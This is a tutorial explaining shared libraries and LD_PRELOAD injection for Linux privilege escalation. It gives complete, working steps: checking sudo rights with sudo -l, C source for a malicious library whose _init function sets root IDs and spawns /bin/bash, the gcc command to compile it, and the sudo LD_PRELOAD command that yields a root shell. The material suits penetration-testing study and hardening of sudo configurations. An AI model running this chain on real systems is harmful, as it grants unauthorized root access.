

### 📚 What Is a Shared Library?

A **shared library** is a file that contains **common code** that different programs can use without having to duplicate that code.

- For example, the library `libc.so` is used by many programs to handle basic tasks like printing text or handling files.

Instead of every program including the same code, it just uses the shared library when needed. This helps save memory and makes the system more efficient.

---

### 🧨 What Is Shared Library Injection?

**Shared library injection** is when we **force a program to load a malicious shared library** (a `.so` file) to **run code** we want, like opening a root shell, changing settings, or escalating privileges.

For example, if we trick a program running with **root permissions** to load our malicious library, we can gain **root access**.

### 🔧 Tools & Techniques for Injection

There are two common methods to inject a shared library:

1. **LD_PRELOAD**: A special environment variable that allows you to inject your custom shared library into a running program.
2. **ptrace**: A system call that allows a program to control and modify another process’s memory, which can also be used for injection.

We’ll focus on the **LD_PRELOAD** method in this example.

---

## 🧑‍💻 Privilege Escalation Example: Using `LD_PRELOAD`

### 1. **Check What You Can Do With Sudo**

First, check what commands you can run as `sudo`:

```bash
sudo -l
```

**Explanation**:

- `sudo -l`: This command lists all the commands you are allowed to run as root (administrator).
- You’re looking for something that runs with `sudo` without asking for a password.

### Example Output:

```
(env_keep+=LD_PRELOAD)
(root) NOPASSWD: /usr/sbin/apache2
```

**What this means**:

- You can run `/usr/sbin/apache2` as **root** (with full permissions) without password.
- The `LD_PRELOAD` environment variable is not restricted, which means you can **inject your own shared library** into the running process.

### 2. **Create a Malicious Shared Library**

Now, we’ll create a malicious shared library that, when loaded, will give us a **root shell**.

- Create a new C file called `shell.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");  // Remove LD_PRELOAD to avoid infinite recursion
setgid(0);  // Set group ID to 0 (root)
setuid(0);  // Set user ID to 0 (root)
system("/bin/bash");  // Execute a root shell
}
```

**Explanation**:

- **`_init()`**: This function is special because it runs automatically when the shared library is loaded.
- **`setuid(0)` and `setgid(0)`**: These commands give us root privileges (UID and GID 0).
- **`system("/bin/bash")`**: This command spawns a **root shell**.

### 3. **Compile the Shared Library**

Now, we need to compile the C code into a shared library file (the `.so` file).

```c
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

**Explanation**:

- **`gcc`**: This is the C compiler.
- **`fPIC`**: This option tells the compiler to create **position-independent code**, which is needed for shared libraries.
- **`shared`**: This creates a shared library, not a regular executable.
- **`o shell.so`**: This specifies the output file name (`shell.so`).
- **`nostartfiles`**: This tells the compiler to skip the default start-up code and use our custom `_init()` function.

### 4. **Inject the Library and Gain Root Access**

Now, run the program (`apache2` in this case) with `sudo` and inject the malicious library using `LD_PRELOAD`:

```bash
sudo LD_PRELOAD=/full/path/to/shell.so /usr/sbin/apache2
```

**Explanation**:

- **`sudo`**: This runs a command as root (administrator).
- **`LD_PRELOAD=/full/path/to/shell.so`**: This tells the system to **preload** our malicious shared library (`shell.so`) before anything else, effectively hijacking the behavior of the `apache2` binary.
- **`/usr/sbin/apache2`**: This is the target binary that you’re running as root.

Once you run this command, it will load your malicious library, and the `_init()` function will run. This gives you a **root shell**.
___

